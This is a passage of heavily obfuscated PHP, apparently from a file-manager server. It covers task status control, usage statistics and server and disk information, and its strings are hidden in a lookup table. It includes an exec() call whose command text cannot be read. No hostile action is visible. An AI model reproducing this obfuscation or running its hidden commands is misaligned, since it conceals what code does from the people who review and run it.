sleep($a¢«‡ù«…í); $this->update(); return; } } goto E™Ô°±ÍÖ´; E™Ô°±ÍÖ´: $a±˜™á°¿õ[$AÇ‹èï¡„†[686]] = $d×‹ªŞÖ¯« ? $d×‹ªŞÖ¯« : $a±˜™á°¿õ[$AÇ‹èï¡„†[686]]; $a±˜™á°¿õ[$AÇ‹èï¡„†[1356]] = $d”­¤îŞ¯[$AÇ‹èï¡„†[1356]] ? $d”­¤îŞ¯[$AÇ‹èï¡„†[1356]] : 0; $a±˜™á°¿õ[$AÇ‹èï¡„†[1355]] = timeFloat(); goto fçàã¦†; bº»ºëŠÌƒ: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($DÙåê÷„¡) { $eàÍé½Œ‚Š =& $_SERVER[¿õñ]; Cache::set($eàÍé½Œ‚Š[1367] . $this->task[$eàÍé½Œ‚Š[364]], $DÙåê÷„¡, 60); return $DÙåê÷„¡; } public static function get($dá†“ƒ§ù) { return self::valueGet($dá†“ƒ§ù); } public static function listData() { $f‰º‡‰İ×Ä = self::valueGet(); return array_sort_by($f‰º‡‰İ×Ä, $_SERVER[¿õñ][1353], !0); } public static function kill($B„ÂÅå°) { return self::changeStatus($B„ÂÅå°, self::STATYS_KILL); } public static function stop($Dê‹‡¢¡‘ñ) { return self::changeStatus($Dê‹‡¢¡‘ñ, self::STATYS_STOP); } public static function restart($bÇÄ½«óø) { return self::changeStatus($bÇÄ½«óø, self::STATYS_RUNNING); } public static function killAll() { $a»ç¢­Ìññ =& $_SERVER[¿õñ]; $a©÷„Š‹‰ = self::listData(); foreach ($a©÷„Š‹‰ as $AŒ¹Â¢×¾ä) { self::kill($AŒ¹Â¢×¾ä[$a»ç¢­Ìññ[364]]); } sleep(2); foreach ($a©÷„Š‹‰ as $AŒ¹Â¢×¾ä) { self::valueSet($AŒ¹Â¢×¾ä[$a»ç¢­Ìññ[364]], !1); } } private static function changeStatus($f½†Ú…Şº, $DšÆ¿µôŠº) { goto b¦íÖ®å‘; B¤–ŠàÁ÷ã: $dïÃÍÏ¸Ñ[$FÖ¯©¨Â´[686]] = $DšÆ¿µôŠº; self::valueSet($f½†Ú…Şº, $dïÃÍÏ¸Ñ); self::log($FÖ¯©¨Â´[1369] . $dïÃÍÏ¸Ñ[$FÖ¯©¨Â´[364]] . $FÖ¯©¨Â´[1370] . $DšÆ¿µôŠº); goto Cêœ»è°á; Cêœ»è°á: return !0; goto CË¾˜´”¼Ï; b¦íÖ®å‘: $FÖ¯©¨Â´ =& $_SERVER[¿õñ]; $dïÃÍÏ¸Ñ = self::valueGet($f½†Ú…Şº); if (!$dïÃÍÏ¸Ñ) { return !1; } goto B¤–ŠàÁ÷ã; CË¾˜´”¼Ï: } public static function valueGet($bÏ˜ßôš¾ = false) { $Cˆ‡š³…Öõ =& $_SERVER[¿õñ]; if ($bÏ˜ßôš¾) { $B§ÛÎ‚Û¤ = Model($Cˆ‡š³…Öõ[395])->where(array($Cˆ‡š³…Öõ[88] => $bÏ˜ßôš¾, $Cˆ‡š³…Öõ[29] => $Cˆ‡š³…Öõ[1371]))->find(); return $B§ÛÎ‚Û¤ ? json_decode($B§ÛÎ‚Û¤[$Cˆ‡š³…Öõ[354]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($B§ò‹èç = false) { goto d²Ó­¦”è; d²Ó­¦”è: $aàŸ§¡Ã‚« =& $_SERVER[¿õñ]; $aÓÆ¬ÀË ‚ = array($aàŸ§¡Ã‚«[29] => $aàŸ§¡Ã‚«[1371]); if ($B§ò‹èç) { $aÓÆ¬ÀË ‚[$aàŸ§¡Ã‚«[1350]] = $B§ò‹èç; } goto Cƒ‰‰ÍÔŒ¬; Cƒ‰‰ÍÔŒ¬: $F‘á–ÏÜ£ = Model($aàŸ§¡Ã‚«[395])->where($aÓÆ¬ÀË ‚)->select(); $F‘á–ÏÜ£ = $F‘á–ÏÜ£ ? $F‘á–ÏÜ£ : array(); foreach ($F‘á–ÏÜ£ as $F’±Ë·Ö©© => $b©Ñã•‹É) { $F‘á–ÏÜ£[$F’±Ë·Ö©©] = json_decode($b©Ñã•‹É[$aàŸ§¡Ã‚«[354]], !0); } goto E…èŸè˜°; E…èŸè˜°: return $F‘á–ÏÜ£; goto f›©Ã ÜÍº; f›©Ã ÜÍº: } public static function valueSet($fÈ©íù Î±, $e»¦§æ¤ôÖ) { goto d£¸ø¸Á³­; d£¸ø¸Á³­: $AÛ«ŞÏ–¦ˆ =& $_SERVER[¿õñ]; if (!$e»¦§æ¤ôÖ) { return Model($AÛ«ŞÏ–¦ˆ[395])->where(array($AÛ«ŞÏ–¦ˆ[88] => $fÈ©íù Î±, $AÛ«ŞÏ–¦ˆ[29] => $AÛ«ŞÏ–¦ˆ[1371]))->delete(); } $fóİç³„Îó = json_encode($e»¦§æ¤ôÖ); goto Aá³ õß‹ë; b–Ê‡ñˆ: Model($AÛ«ŞÏ–¦ˆ[395])->add($bÚªÖŸ‹, array(), !0); goto cÃÁ–ÓèÁ´; Aá³ õß‹ë: if (!$fóİç³„Îó) { ob_start(); var_dump($e»¦§æ¤ôÖ); $f–¡§Ã‰¥í = ob_get_clean(); self::log($AÛ«ŞÏ–¦ˆ[1372] . json_encode_force($f–¡§Ã‰¥í)); } if (!$fÈ©íù Î± || !$e»¦§æ¤ôÖ[$AÛ«ŞÏ–¦ˆ[364]]) { return !1; } $bÚªÖŸ‹ = array($AÛ«ŞÏ–¦ˆ[29] => $AÛ«ŞÏ–¦ˆ[1371], $AÛ«ŞÏ–¦ˆ[1350] => USER_ID, $AÛ«ŞÏ–¦ˆ[88] => $fÈ©íù Î±, $AÛ«ŞÏ–¦ˆ[354] => $fóİç³„Îó); goto b–Ê‡ñˆ; cÃÁ–ÓèÁ´: } public static function log($BÁÔùÇª‡ì) { write_log($BÁÔùÇª‡ì, $_SERVER[¿õñ][1373]); } } goto CŠÔƒÙÌˆá; CÓ«âš„®¼: class ZipStream { } class AnalysisModel extends ModelBaseLight { public function init($fô°ÈêµŒ•) { $fâ¦˜¤äèÍ =& $_SERVER[¿õñ]; $D¡«ƒÅ¶½ = array($fâ¦˜¤äèÍ[527] => array($fâ¦˜¤äèÍ[29] => $fâ¦˜¤äèÍ[1940], $fâ¦˜¤äèÍ[258] => array($fâ¦˜¤äèÍ[207], $fâ¦˜¤äèÍ[697], $fâ¦˜¤äèÍ[1941], $fâ¦˜¤äèÍ[1942])), $fâ¦˜¤äèÍ[1943] => array($fâ¦˜¤äèÍ[29] => $fâ¦˜¤äèÍ[1944], $fâ¦˜¤äèÍ[258] => array($fâ¦˜¤äèÍ[207], $fâ¦˜¤äèÍ[695], $fâ¦˜¤äèÍ[1945], $fâ¦˜¤äèÍ[1946], $fâ¦˜¤äèÍ[1947]))); if (!isset($D¡«ƒÅ¶½[$fô°ÈêµŒ•])) { return !1; } $this->optionType = $D¡«ƒÅ¶½[$fô°ÈêµŒ•][$fâ¦˜¤äèÍ[29]]; $this->field = $D¡«ƒÅ¶½[$fô°ÈêµŒ•][$fâ¦˜¤äèÍ[258]]; return !0; } public function listData($CÉ™ùÏ¶Ç = false, $bŞ¶ùíåÈ = "\x6d\x6f\144\151\x66\171\x54\x69\x6d\x65", $dÁ¸ŠßÇ¹ğ = false) { return parent::listData($CÉ™ùÏ¶Ç, $bŞ¶ùíåÈ, $dÁ¸ŠßÇ¹ğ); } public function trendList($C·ÉÔÛéƒ³) { goto dŒ­–‰; dŒ­–‰: $e÷‡Ñµ÷éØ =& $_SERVER[¿õñ]; $c¹µÎ©áñÂ = $this->listData(); if ($c¹µÎ©áñÂ) { $AŸñÚ¶İˆ¸ = end($c¹µÎ©áñÂ); $e¡âó¼“½Ë = date($e÷‡Ñµ÷éØ[1948], strtotime($e÷‡Ñµ÷éØ[1949])); if ($AŸñÚ¶İˆ¸[$e÷‡Ñµ÷éØ[207]] == $e¡âó¼“½Ë) { return $c¹µÎ©áñÂ; } $Dš„Û¦Š£Ë = strtotime($AŸñÚ¶İˆ¸[$e÷‡Ñµ÷éØ[207]]); } goto AÆÑêª†¥›; AïØ×›ÂŠê: foreach ($bÚ‚‚¤§×İ as $e¡âó¼“½Ë) { $this->{$E¨åóÅ«}($e¡âó¼“½Ë); } return $this->listData(); goto BÈõªÆ“Å…; AÆÑêª†¥›: if (!isset($Dš„Û¦Š£Ë)) { $ešÄîÄğâÛ = $C·ÉÔÛéƒ³ == $e÷‡Ñµ÷éØ[527] ? $e÷‡Ñµ÷éØ[469] : $e÷‡Ñµ÷éØ[759]; $Dš„Û¦Š£Ë = Model($ešÄîÄğâÛ)->min($e÷‡Ñµ÷éØ[184]); } $E¨åóÅ« = $e÷‡Ñµ÷éØ[1950] . ucfirst($C·ÉÔÛéƒ³); $bÚ‚‚¤§×İ = $this->dateList($Dš„Û¦Š£Ë); goto AïØ×›ÂŠê; BÈõªÆ“Å…: } private function dateList($CÚ­ÚËŒ©Š) { $B¶¶Š·ê¹¯ =& $_SERVER[¿õñ]; $b­ˆº§Îè = $CÚ­ÚËŒ©Š; $cóÙ»¼Å³ø = strtotime($B¶¶Š·ê¹¯[1949]); $C™°ƒ©æØ˜ = array(); while ($b­ˆº§Îè <= $cóÙ»¼Å³ø) { $C™°ƒ©æØ˜[] = date($B¶¶Š·ê¹¯[1948], $b­ˆº§Îè); $b­ˆº§Îè = strtotime($B¶¶Š·ê¹¯[1951], $b­ˆº§Îè); } return $C™°ƒ©æØ˜; } public function _recordUser($d¬â•­õ† = '') { goto c²Ùğİ­Â„; c‘“Ìã§‚Ù: $BÌÓäø‚„³ = array($A…ï–¹Š»‹[207] => $d¬â•­õ†, $A…ï–¹Š»‹[697] => (int) $b¼äÊ´“óä, $A…ï–¹Š»‹[1941] => (int) $FºÔö¨ïñ½, $A…ï–¹Š»‹[1942] => (int) $F‚¦Ûìˆ¼È); return $this->insert($BÌÓäø‚„³); goto cõãº; c²Ùğİ­Â„: $A…ï–¹Š»‹ =& $_SERVER[¿õñ]; $A¡«Óó„Í = strtotime(date($A…ï–¹Š»‹[1952], strtotime($d¬â•­õ†))); $f¨èï¸¬ = strtotime(date($A…ï–¹Š»‹[1953], strtotime($d¬â•­õ†))); goto E…ÄÎ´Åôó; eöÑƒ‰¹š¡: $FºÔö¨ïñ½ = Model($A…ï–¹Š»‹[469])->where($b—İ¤˜Ğ)->count($A…ï–¹Š»‹[1350]); $b—İ¤˜Ğ[$A…ï–¹Š»‹[29]] = $A…ï–¹Š»‹[1954]; $F‚¦Ûìˆ¼È = Model($A…ï–¹Š»‹[1955])->where($b—İ¤˜Ğ)->count($A…ï–¹Š»‹[1956]); goto c‘“Ìã§‚Ù; E…ÄÎ´Åôó: $b—İ¤˜Ğ = array($A…ï–¹Š»‹[184] => array($A…ï–¹Š»‹[934], $f¨èï¸¬)); $b¼äÊ´“óä = Model($A…ï–¹Š»‹[469])->where($b—İ¤˜Ğ)->count($A…ï–¹Š»‹[1350]); $b—İ¤˜Ğ[$A…ï–¹Š»‹[184]] = array($A…ï–¹Š»‹[318], array($A¡«Óó„Í, $f¨èï¸¬)); goto eöÑƒ‰¹š¡; cõãº: } public function _recordStore($bí¿È·óÇ¦ = '') { goto AİÔ‚á’¯ó; E†‚øÑÚé˜: $D¥çø ºò¥ = Model($Fé‚ ÎóÃ[418])->where($Dîê¦šÉ·ƒ)->sum($Fé‚ ÎóÃ[78]); $Dîê¦šÉ·ƒ[$Fé‚ ÎóÃ[367]] = 0; $cÖ¢·ğ¯ÎÀ = Model($Fé‚ ÎóÃ[759])->where($Dîê¦šÉ·ƒ)->sum($Fé‚ ÎóÃ[78]); goto dóÍ×¼ù­; AİÔ‚á’¯ó: $Fé‚ ÎóÃ =& $_SERVER[¿õñ]; $a­ÇØçò¡ó = strtotime(date($Fé‚ ÎóÃ[1953], strtotime($bí¿È·óÇ¦))); $Dîê¦šÉ·ƒ = array($Fé‚ ÎóÃ[184] => array($Fé‚ ÎóÃ[934], $a­ÇØçò¡ó)); goto E†‚øÑÚé˜; dóÍ×¼ù­: $Dîê¦šÉ·ƒ[$Fé‚ ÎóÃ[368]] = 1; $aÊ‰Í½òñÅ = Model($Fé‚ ÎóÃ[759])->where($Dîê¦šÉ·ƒ)->sum($Fé‚ ÎóÃ[78]); $Dîê¦šÉ·ƒ[$Fé‚ ÎóÃ[368]] = 2; goto B‰Œïã˜; B‰Œïã˜: $fÒÉÚªšÄ‡ = Model($Fé‚ ÎóÃ[759])->where($Dîê¦šÉ·ƒ)->sum($Fé‚ ÎóÃ[78]); $c›ôêãŠ’ = array($Fé‚ ÎóÃ[207] => $bí¿È·óÇ¦, $Fé‚ ÎóÃ[695] => (int) $cÖ¢·ğ¯ÎÀ, $Fé‚ ÎóÃ[1945] => (int) $D¥çø ºò¥, $Fé‚ ÎóÃ[1946] => (int) $aÊ‰Í½òñÅ, $Fé‚ ÎóÃ[1947] => (int) $fÒÉÚªšÄ‡); return $this->insert($c›ôêãŠ’); goto dôÌô†¡´ë; dôÌô†¡´ë: } public function trend($Bà‚œ˜Š‡Ñ, $B˜¸Şêõæô) { goto Ağ¾ŞÂ¸; Cİ°‚”õõ: return $e»ãÖéø«; goto c´ŒÎˆ¤Š; aŞêõ¥Š³Ş: if (empty($DçæáÏò…)) { $açÈã¢äÄÕ = date($CŒ”¸ˆ…²[1948], strtotime($CŒ”¸ˆ…²[1949])); $BÊ‚Ğ¹¿¬ = array($CŒ”¸ˆ…²[207] => $açÈã¢äÄÕ); foreach ($aóöîôİ÷è[$Bà‚œ˜Š‡Ñ] as $A©†ÚíàÓ« => $bâğÆÓ©¹÷) { $BÊ‚Ğ¹¿¬[$A©†ÚíàÓ«] = 0; } $DçæáÏò…[] = $BÊ‚Ğ¹¿¬; } $e»ãÖéø« = array(); foreach ($DçæáÏò… as $bâğÆÓ©¹÷) { if ($Bà‚œ˜Š‡Ñ == $CŒ”¸ˆ…²[1943] && $bâğÆÓ©¹÷[$CŒ”¸ˆ…²[1945]] > $bâğÆÓ©¹÷[$CŒ”¸ˆ…²[695]]) { $bâğÆÓ©¹÷[$CŒ”¸ˆ…²[1945]] = $bâğÆÓ©¹÷[$CŒ”¸ˆ…²[695]]; } foreach ($aóöîôİ÷è[$Bà‚œ˜Š‡Ñ] as $A©†ÚíàÓ« => $aĞÑëÈãÊÇ) { $C´’ª—Ñªï = array($CŒ”¸ˆ…²[207] => $bâğÆÓ©¹÷[$CŒ”¸ˆ…²[207]], $CŒ”¸ˆ…²[1247] => $aĞÑëÈãÊÇ); $C´’ª—Ñªï[$cß„Ö®[$Bà‚œ˜Š‡Ñ]] = isset($bâğÆÓ©¹÷[$A©†ÚíàÓ«]) ? $bâğÆÓ©¹÷[$A©†ÚíàÓ«] : 0; $e»ãÖéø«[] = $C´’ª—Ñªï; } } goto Cİ°‚”õõ; DÛî…Ñùæ: if ($DçæáÏò… && $B˜¸Şêõæô != $CŒ”¸ˆ…²[1325]) { $fÑÆÁùÂĞ = $DçæáÏò…[0][$CŒ”¸ˆ…²[207]]; $F±„Ï£™Ç– = $this->validDate($B˜¸Şêõæô, $fÑÆÁùÂĞ); $b¨£¥±Ñ¹ì = array(); $C½ÜÔêÃ°¯ = array_to_keyvalue($DçæáÏò…, $CŒ”¸ˆ…²[207]); foreach ($F±„Ï£™Ç– as $açÈã¢äÄÕ) { if (isset($C½ÜÔêÃ°¯[$açÈã¢äÄÕ])) { $C´’ª—Ñªï = $C½ÜÔêÃ°¯[$açÈã¢äÄÕ]; } else { $C´’ª—Ñªï = end($DçæáÏò…); $C´’ª—Ñªï[$CŒ”¸ˆ…²[207]] = $açÈã¢äÄÕ; if ($Bà‚œ˜Š‡Ñ == $CŒ”¸ˆ…²[527]) { $C´’ª—Ñªï[$CŒ”¸ˆ…²[1941]] = $C´’ª—Ñªï[$CŒ”¸ˆ…²[1942]] = 0; } } $b¨£¥±Ñ¹ì[] = $C´’ª—Ñªï; } $DçæáÏò… = $b¨£¥±Ñ¹ì; } $aóöîôİ÷è = array($CŒ”¸ˆ…²[527] => array($CŒ”¸ˆ…²[697] => LNG($CŒ”¸ˆ…²[1957]), $CŒ”¸ˆ…²[1941] => LNG($CŒ”¸ˆ…²[1958]), $CŒ”¸ˆ…²[1942] => LNG($CŒ”¸ˆ…²[1959])), $CŒ”¸ˆ…²[1943] => array($CŒ”¸ˆ…²[695] => LNG($CŒ”¸ˆ…²[1960]), $CŒ”¸ˆ…²[1945] => LNG($CŒ”¸ˆ…²[1961]), $CŒ”¸ˆ…²[1946] => LNG($CŒ”¸ˆ…²[1962]), $CŒ”¸ˆ…²[1947] => LNG($CŒ”¸ˆ…²[1963]))); $cß„Ö® = array($CŒ”¸ˆ…²[527] => $CŒ”¸ˆ…²[1964], $CŒ”¸ˆ…²[1943] => $CŒ”¸ˆ…²[78]); goto aŞêõ¥Š³Ş; Ağ¾ŞÂ¸: $CŒ”¸ˆ…² =& $_SERVER[¿õñ]; if (!$this->init($Bà‚œ˜Š‡Ñ)) { return !1; } $DçæáÏò… = $this->trendList($Bà‚œ˜Š‡Ñ); goto DÛî…Ñùæ; c´ŒÎˆ¤Š: } public function validDate($DËğÚçŞ¾², $BØ˜¸ÂçÑÀ) { goto f”ÁºİÖ×é; b‰ŒÅ«÷å: switch ($DËğÚçŞ¾²) { case $A§¿Òª¿õ[1332]: $DïÖÕÁ¡”¼ = mktime(0, 0, 0, date($A§¿Òª¿õ[1965]), date($A§¿Òª¿õ[1966]) - date($A§¿Òª¿õ[1194]) + 7 - 7, date($A§¿Òª¿õ[1967])); $D’Ş–­ù„š = 0; do { $BÊ”‹±©´· = date($A§¿Òª¿õ[1948], $DïÖÕÁ¡”¼ - 3600 * 24 * 7 * $D’Ş–­ù„š); $a¢Üß·Ù“ò[] = $BÊ”‹±©´·; $D’Ş–­ù„š++; } while ($BØ˜¸ÂçÑÀ < $BÊ”‹±©´·); break; case $A§¿Òª¿õ[1330]: $D’Ş–­ù„š = 1; do { $A¹±”¯É‹Ş = date($A§¿Òª¿õ[1968], strtotime("\x2d\x20{$D’Ş–­ù„š}\x20\155\157\x6e\x74\x68\163")); $a¢Üß·Ù“ò[] = $A¹±”¯É‹Ş; $D’Ş–­ù„š++; } while ($BØ˜¸ÂçÑÀ < $A¹±”¯É‹Ş); break; case $A§¿Òª¿õ[1633]: $bïïùï›çà = (int) date($A§¿Òª¿õ[1967], strtotime($BØ˜¸ÂçÑÀ)); $eâÜñÑ†¶° = (int) date($A§¿Òª¿õ[1967]); if ($bïïùï›çà >= $eâÜñÑ†¶°) { break; } for ($bïïùï›çà; $bïïùï›çà < $eâÜñÑ†¶°; $bïïùï›çà++) { $a¢Üß·Ù“ò[] = $bïïùï›çà . $A§¿Òª¿õ[1969]; } break; default: break; } if ($BØ˜¸ÂçÑÀ > end($a¢Üß·Ù“ò)) { array_pop($a¢Üß·Ù“ò); } sort($a¢Üß·Ù“ò); goto C¬õµ‡á‰º; f”ÁºİÖ×é: $A§¿Òª¿õ =& $_SERVER[¿õñ]; $bÍÇ©—ä‹Í = date($A§¿Òª¿õ[1948], strtotime($A§¿Òª¿õ[1949])); $a¢Üß·Ù“ò = array($bÍÇ©—ä‹Í); goto b‰ŒÅ«÷å; C¬õµ‡á‰º: return $a¢Üß·Ù“ò; goto f‘»™‡¹Ö; f‘»™‡¹Ö: } public function listTable($Bİá™°“ßà) { $aÔˆ¥´ÃÈ = ucfirst($Bİá™°“ßà); return Model($aÔˆ¥´ÃÈ)->listData(); } public function option($c¬ Ò‹çÁ§) { $C‚“Ü–Åïù = $_SERVER[¿õñ][1970] . ucfirst($c¬ Ò‹çÁ§); return $this->{$C‚“Ü–Åïù}(); } private function optionUser() { goto dŠ‘‘Ô„Ç¶; fœì­«ÌÂš: $Fàá‚›ˆÇ½ = strtotime($eµö§´Ô¨•[1972]); $F¹²Ù§àÛé = array($eµö§´Ô¨•[1973] => array($eµö§´Ô¨•[935], $Fàá‚›ˆÇ½)); $Cæ¿—¼²ğ = (int) Model($eµö§´Ô¨•[469])->where($F¹²Ù§àÛé)->count($eµö§´Ô¨•[1350]); goto A»Ë‘¤Ò›ˆ; fæ‰¸èíö×: $fµ…êÓ¯†í = Model($eµö§´Ô¨•[469])->where($F¹²Ù§àÛé)->count($eµö§´Ô¨•[1350]); return array($eµö§´Ô¨•[692] => (int) $dã¼ë¦ñŠ, $eµö§´Ô¨•[1974] => (int) ($dã¼ë¦ñŠ - $dÙÎˆ‡°Ÿ), $eµö§´Ô¨•[1975] => (int) $dÙÎˆ‡°Ÿ, $eµö§´Ô¨•[1976] => (int) $fµ…êÓ¯†í, $eµö§´Ô¨•[1977] => $Cæ¿—¼²ğ); goto dÀ«³®Ü©„; A»Ë‘¤Ò›ˆ: if (!$Cæ¿—¼²ğ) { $Cæ¿—¼²ğ = 1; } $Fàá‚›ˆÇ½ = strtotime(date($eµö§´Ô¨•[1952])); $F¹²Ù§àÛé = array($eµö§´Ô¨•[1973] => array($eµö§´Ô¨•[935], $Fàá‚›ˆÇ½)); goto fæ‰¸èíö×; dŠ‘‘Ô„Ç¶: $eµö§´Ô¨• =& $_SERVER[¿õñ]; $dã¼ë¦ñŠ = Model($eµö§´Ô¨•[469])->count($eµö§´Ô¨•[1350]); $dÙÎˆ‡°Ÿ = Model($eµö§´Ô¨•[469])->where($eµö§´Ô¨•[1971])->count($eµö§´Ô¨•[1350]); goto fœì­«ÌÂš; dÀ«³®Ü©„: } private function optionFile() { goto F©„‰Óø«‹; dªÀÃƒô£: $F„‘ê‹À­´ = Model($a¤¹Â‹Ôñ–[759])->where($a‡“äçéË)->sum($a¤¹Â‹Ôñ–[78]); $C§ˆÖ‡Å×À = Model($a¤¹Â‹Ôñ–[759])->where($a‡“äçéË)->count($a¤¹Â‹Ôñ–[366]); return array($a¤¹Â‹Ôñ–[695] => $Bè©¶ù¶ò–, $a¤¹Â‹Ôñ–[1945] => $e ¢Öåà¤í, $a¤¹Â‹Ôñ–[1978] => $Bè©¶ù¶ò– - $e ¢Öåà¤í, $a¤¹Â‹Ôñ–[1979] => (int) $F„‘ê‹À­´, $a¤¹Â‹Ôñ–[697] => (int) $DÇ½§×ã¢Õ, $a¤¹Â‹Ôñ–[1980] => (int) $C§ˆÖ‡Å×À); goto F´Š¤ô• ì; F©„‰Óø«‹: $a¤¹Â‹Ôñ– =& $_SERVER[¿õñ]; $CƒŠĞĞæ›² = $this->sourceSize(); $Bè©¶ù¶ò– = $CƒŠĞĞæ›²[$a¤¹Â‹Ôñ–[78]]; goto bÃëœª˜¬Ä; bÃëœª˜¬Ä: $e ¢Öåà¤í = $CƒŠĞĞæ›²[$a¤¹Â‹Ôñ–[1945]]; $DÇ½§×ã¢Õ = Model($a¤¹Â‹Ôñ–[759])->where(array($a¤¹Â‹Ôñ–[367] => 0))->count($a¤¹Â‹Ôñ–[366]); $a‡“äçéË = array($a¤¹Â‹Ôñ–[367] => 0, $a¤¹Â‹Ôñ–[184] => array($a¤¹Â‹Ôñ–[935], strtotime(date($a¤¹Â‹Ôñ–[1952])))); goto dªÀÃƒô£; F´Š¤ô• ì: } private function optionAccess() { $D¨ë³Ş¥¿á =& $_SERVER[¿õñ]; return array($D¨ë³Ş¥¿á[692] => $this->typeLogCnt(), $D¨ë³Ş¥¿á[90] => $this->typeLogCnt($D¨ë³Ş¥¿á[90]), $D¨ë³Ş¥¿á[400] => $this->typeLogCnt($D¨ë³Ş¥¿á[400]), $D¨ë³Ş¥¿á[1981] => $this->typeLogCnt($D¨ë³Ş¥¿á[1981]), $D¨ë³Ş¥¿á[1982] => $this->typeLogCnt($D¨ë³Ş¥¿á[1982]), $D¨ë³Ş¥¿á[527] => $this->typeLogCnt($D¨ë³Ş¥¿á[33], $D¨ë³Ş¥¿á[1956])); } private function typeLogCnt($Fà°ï¯Äªœ = '', $CÀ©ì‚¯„İ = "\x69\144") { goto A²ã¥Œ“ä; eê§¾„İ‹: $CŒº†°ØÅ = array($B…Š‚èĞÉ[184] => array($B…Š‚èĞÉ[935], $DöÙ³®‰ò)); if ($Fà°ï¯Äªœ) { $CŒº†°ØÅ[$B…Š‚èĞÉ[29]] = array($B…Š‚èĞÉ[7], $c¶öÄáÄÉ„[$Fà°ï¯Äªœ]); } $d³í¢èëŒ = Model($B…Š‚èĞÉ[1955])->where($CŒº†°ØÅ)->count($CÀ©ì‚¯„İ); goto bÆóÕ”…Ì§; A²ã¥Œ“ä: $B…Š‚èĞÉ =& $_SERVER[¿õñ]; $c¶öÄáÄÉ„ = array($B…Š‚èĞÉ[90] => array($B…Š‚èĞÉ[1983], $B…Š‚èĞÉ[1984]), $B…Š‚èĞÉ[400] => array($B…Š‚èĞÉ[1985]), $B…Š‚èĞÉ[1981] => array($B…Š‚èĞÉ[1986], $B…Š‚èĞÉ[1987]), $B…Š‚èĞÉ[1982] => array($B…Š‚èĞÉ[1988], $B…Š‚èĞÉ[1989]), $B…Š‚èĞÉ[1990] => array($B…Š‚èĞÉ[1991], $B…Š‚èĞÉ[1992], $B…Š‚èĞÉ[1993])); $DöÙ³®‰ò = strtotime(date($B…Š‚èĞÉ[1952])); goto eê§¾„İ‹; bÆóÕ”…Ì§: return (int) $d³í¢èëŒ; goto a‡Ó÷·Ñ¼¼; a‡Ó÷·Ñ¼¼: } private function optionServer() { goto CÈÄ§Û‘„¿; CÈÄ§Û‘„¿: $e‹°ö¢§°ä =& $_SERVER[¿õñ]; $CÅ¾ƒÊø• = $this->diskDriver(); $c‹ä¸·áãô = KodIO::defaultDriver(); goto bÄ¥ñ½½‘Ï; bÄ¥ñ½½‘Ï: $Fİíª§Õ£è = array($e‹°ö¢§°ä[720] => $c‹ä¸·áãô[$e‹°ö¢§°ä[364]]); $Aªå¦µ•‰Ó = Model($e‹°ö¢§°ä[418])->where($Fİíª§Õ£è)->sum($e‹°ö¢§°ä[78]); $E“ëÎòÆ” = explode($e‹°ö¢§°ä[50], $_SERVER[$e‹°ö¢§°ä[136]]); goto FÉ°¥½‘§; cğŒæ·ï–ê: return array($e‹°ö¢§°ä[1996] => $CÅ¾ƒÊø• ? $CÅ¾ƒÊø•[$e‹°ö¢§°ä[1997]] : 0, $e‹°ö¢§°ä[1998] => $CÅ¾ƒÊø• ? $CÅ¾ƒÊø•[$e‹°ö¢§°ä[1999]] : 0, $e‹°ö¢§°ä[2000] => (int) $c‹ä¸·áãô[$e‹°ö¢§°ä[1997]] * 1024 * 1024 * 1024, $e‹°ö¢§°ä[2001] => (int) $Aªå¦µ•‰Ó, $e‹°ö¢§°ä[2002] => ucfirst($Fù¬Œ§ Ê), $e‹°ö¢§°ä[2003] => $e‹°ö¢§°ä[2004] . PHP_VERSION, $e‹°ö¢§°ä[2005] => phpBuild64() ? 64 : 32, $e‹°ö¢§°ä[691] => str_replace($e‹°ö¢§°ä[2006], $e‹°ö¢§°ä[911], $a¾àñÆ¹ˆ¼), $e‹°ö¢§°ä[334] => ucfirst($DĞÇàá¶”), $e‹°ö¢§°ä[28] => $_SERVER[$e‹°ö¢§°ä[2007]]); goto Dï†ÀËÁä„; FÉ°¥½‘§: $Fù¬Œ§ Ê = $E“ëÎòÆ”[0]; $D‚¦¶ìñ‰ä = $GLOBALS[$e‹°ö¢§°ä[6]][$e‹°ö¢§°ä[17]]; $a¾àñÆ¹ˆ¼ = $D‚¦¶ìñ‰ä[$e‹°ö¢§°ä[730]]; goto CøÚ³Ñ¬¼˜; CøÚ³Ñ¬¼˜: if ($a¾àñÆ¹ˆ¼ == $e‹°ö¢§°ä[731]) { $eÙËóÁ‚×¢ = explode($e‹°ö¢§°ä[732], $D‚¦¶ìñ‰ä[$e‹°ö¢§°ä[733]]); $a¾àñÆ¹ˆ¼ = $eÙËóÁ‚×¢[0]; } if ($a¾àñÆ¹ˆ¼ == $e‹°ö¢§°ä[831] || $a¾àñÆ¹ˆ¼ == $e‹°ö¢§°ä[713]) { $eâà‡†ª‚ = Model()->db()->query($e‹°ö¢§°ä[1994]); $fÁ“ˆà¢î– = $eâà‡†ª‚[0] && isset($eâà‡†ª‚[0][$e‹°ö¢§°ä[1246]]) ? $eâà‡†ª‚[0][$e‹°ö¢§°ä[1246]] : 0; $a¾àñÆ¹ˆ¼ = $e‹°ö¢§°ä[1995] . ($fÁ“ˆà¢î– ? $e‹°ö¢§°ä[8] . $fÁ“ˆà¢î– : $e‹°ö¢§°ä[33]); } $DĞÇàá¶” = $GLOBALS[$e‹°ö¢§°ä[6]][$e‹°ö¢§°ä[334]][$e‹°ö¢§°ä[760]]; goto cğŒæ·ï–ê; Dï†ÀËÁä„: } private function diskDriver() { goto dÚµ—á«•; E¡Æ«‘¦Šƒ: $D˜ ·âˆ”× = $aÙøª„’ïÕ - @disk_free_space($eáà´–ÅóÂ); return array($FÙ›Ùâİé[1997] => $aÙøª„’ïÕ, $FÙ›Ùâİé[1999] => $D˜ ·âˆ”×); goto dùİãÌˆÄ“; dÚµ—á«•: $FÙ›Ùâİé =& $_SERVER[¿õñ]; $eáà´–ÅóÂ = $FÙ›Ùâİé[8]; $D´±ŸŞÉ£° = $GLOBALS[$FÙ›Ùâİé[6]][$FÙ›Ùâİé[2008]] == $FÙ›Ùâİé[2009]; goto e©ÍŞùÍ¾©; e©ÍŞùÍ¾©: if ($D´±ŸŞÉ£°) { $eáà´–ÅóÂ = $FÙ›Ùâİé[2010]; if (function_exists($FÙ›Ùâİé[2011])) { exec($FÙ›Ùâİé[2012], $Bƒ¹ñ¬½Ì); $eáà´–ÅóÂ = $Bƒ¹ñ¬½Ì[1] . $FÙ›Ùâİé[8]; } } if (!file_exists($eáà´–ÅóÂ)) { return; } $aÙøª„’ïÕ = @disk_total_space($eáà´–ÅóÂ); 